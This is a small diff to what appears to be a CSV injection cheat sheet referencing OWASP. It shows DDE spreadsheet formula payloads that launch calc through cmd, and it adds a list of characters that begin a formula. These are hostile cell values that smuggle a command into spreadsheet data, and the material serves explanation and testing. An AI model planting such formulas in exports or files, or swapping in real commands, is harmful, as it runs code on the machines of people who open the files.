@@ -7,5 +7,11 @@
 =DDE("cmd";"/C calc";"__DdeLink_60_870516294")
 =cmd|' /C calc'!A0
 ```
-
+Any formula can be started with
+```
+=
++
+–
+@
+```
 ## Reference: https://www.owasp.org/index.php/CSV_Injection
